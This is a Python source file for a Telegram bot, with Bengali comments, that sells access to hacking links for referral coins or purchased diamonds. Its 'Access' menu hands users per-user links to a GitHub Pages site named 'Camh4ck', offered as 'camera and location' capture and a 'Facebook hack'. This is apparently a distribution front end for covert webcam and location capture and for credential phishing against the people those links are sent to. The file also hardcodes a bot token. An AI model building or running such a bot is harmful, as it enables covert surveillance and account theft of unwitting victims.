import telebot
from telebot import types
import requests
import time
from flask import Flask
from threading import Thread
import os

# সেটিংস
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
ADMIN_USERNAME = "Zord_Admin" 
CHANNEL_ID = "@hackingacademyX" # আপনার চ্যানেলের ইউজারনেম
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/"
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

bot = telebot.TeleBot(BOT_TOKEN)

# --- ফায়ারবেস ফাংশনসমূহ ---
def get_user(user_id):
    res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
    data = res.json()
    if data:
        # পুরনো ইউজারের ডাটাতে ডায়মন্ড না থাকলে ০ সেট করবে
        if "diamonds" not in data: data["diamonds"] = 0
        return data
    return {"coins": 0, "diamonds": 0, "referred_by": None}

def save_user(user_id, data):
    requests.patch(f"{FIREBASE_URL}/users/{user_id}.json", json=data)

def get_promo(code):
    res = requests.get(f"{FIREBASE_URL}/promo/{code}.json")
    return res.json()

def delete_promo(code):
    requests.delete(f"{FIREBASE_URL}/promo/{code}.json")

# --- চ্যানেল সাবস্ক্রিপশন চেক ---
def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# --- রেন্ডার পোর্ট ফিক্স ---
app = Flask('')
@app.route('/')
def home(): return "Zord Multi-Currency Bot Active!"
def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
def keep_alive(): Thread(target=run).start()

# --- নিচতলার মেনু ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start", "💰 My Assets")
    markup.row("👥 Refer", "🔥 Access")
    return markup

@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = message.chat.id
    args = message.text.split()
    
    # নতুন ইউজার ও রেফারেল চেক
    user_data = get_user(user_id)
    is_new = requests.get(f"{FIREBASE_URL}/users/{user_id}.json").json() is None
    
    if is_new:
        if len(args) > 1 and args[1].isdigit():
            ref_id = args[1]
            if str(ref_id) != str(user_id):
                ref_data = get_user(ref_id)
                ref_data['coins'] += 50 # রেফারেল বোনাস ৫০ কয়েন
                save_user(ref_id, ref_data)
                bot.send_message(ref_id, "🎉 অভিনন্দন! কেউ আপনার লিঙ্কে জয়েন করেছে। ৫০ কয়েন পেয়েছেন।")
        save_user(user_id, {"coins": 0, "diamonds": 0})

    if not is_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন", url="https://t.me/hackingacademyX"))
        markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
        bot.send_message(user_id, "⚠️ বোট ব্যবহার করতে হলে আমাদের চ্যানেলে জয়েন থাকতে হবে!", reply_markup=markup)
        return

    bot.send_message(user_id, "👋 স্বাগতম! আপনি এখন প্রো হ্যাকিং একাডেমিতে আছেন।", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.chat.id
    text = message.text
    data = get_user(user_id)

    if text == "🚀 Start":
        bot.send_message(user_id, "বোট অ্যাক্টিভ আছে। নিচের মেনু ব্যবহার করুন।", reply_markup=main_menu())

    elif text == "💰 My Assets":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 Assets কিনুন", url=f"https://t.me/{ADMIN_USERNAME}"),
                   types.InlineKeyboardButton("🎁 Redeem Code", callback_data="redeem_ui"))
        msg = f"📊 **আপনার সম্পদ:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}"
        bot.send_message(user_id, msg, reply_markup=markup, parse_mode='Markdown')

    elif text == "👥 Refer":
        bot_user = bot.get_me().username
        link = f"https://t.me/{bot_user}?start={user_id}"
        bot.send_message(user_id, f"🔗 আপনার রেফারেল লিঙ্ক:\n{link}\n\nপ্রতিটি রেফারে পাবেন ৫০ কয়েন!")

    elif text == "🔥 Access":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📸 ক্যামেরা ও লোকেশন (10 Coin)", callback_data="use_cam"),
                   types.InlineKeyboardButton("🔐 ফেসবুক হ্যাক (1 Diamond)", callback_data="use_fb"))
        bot.send_message(user_id, "আপনি কিসের অ্যাক্সেস নিতে চান?", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.message.chat.id
    data = get_user(user_id)

    if call.data == "verify_join":
        if is_subscribed(user_id):
            bot.delete_message(user_id, call.message.message_id)
            bot.send_message(user_id, "ধন্যবাদ! এখন আপনি বোট ব্যবহার করতে পারবেন।", reply_markup=main_menu())
        else:
            bot.answer_callback_query(call.id, "আপনি এখনো জয়েন করেননি!", show_alert=True)

    elif call.data == "redeem_ui":
        msg = bot.send_message(user_id, "আপনার রিডিম কোডটি এখানে লিখুন:")
        bot.register_next_step_handler(msg, process_redeem)

    elif call.data == "use_cam":
        if data.get('coins', 0) >= 10:
            data['coins'] -= 10
            save_user(user_id, data)
            exp = int(time.time()) + 3600
            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক: {BASE_URL}?id={user_id}&exp={exp}")
        else: bot.answer_callback_query(call.id, "পর্যাপ্ত কয়েন নেই! রেফার করুন।", show_alert=True)

    elif call.data == "use_fb":
        if data.get('diamonds', 0) >= 1:
            data['diamonds'] -= 1
            save_user(user_id, data)
            exp = int(time.time()) + 3600
            bot.send_message(user_id, f"✅ ফেসবুক প্রো লিঙ্ক: {BASE_URL}fb/?id={user_id}&exp={exp}")
        else: bot.answer_callback_query(call.id, "আপনার ডায়মন্ড নেই! অ্যাডমিনের থেকে কিনুন।", show_alert=True)

def process_redeem(message):
    code = message.text
    promo = get_promo(code)
    if promo:
        user_data = get_user(message.chat.id)
        if 'coin_amount' in promo:
            user_data['coins'] += promo['coin_amount']
            txt = f"✅ {promo['coin_amount']} কয়েন যোগ হয়েছে!"
        elif 'diamond_amount' in promo:
            user_data['diamonds'] += promo['diamond_amount']
            txt = f"✅ {promo['diamond_amount']} ডায়মন্ড যোগ হয়েছে!"
        
        save_user(message.chat.id, user_data)
        delete_promo(code)
        bot.send_message(message.chat.id, txt)
    else:
        bot.send_message(message.chat.id, "❌ ভুল রিডিম কোড!")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
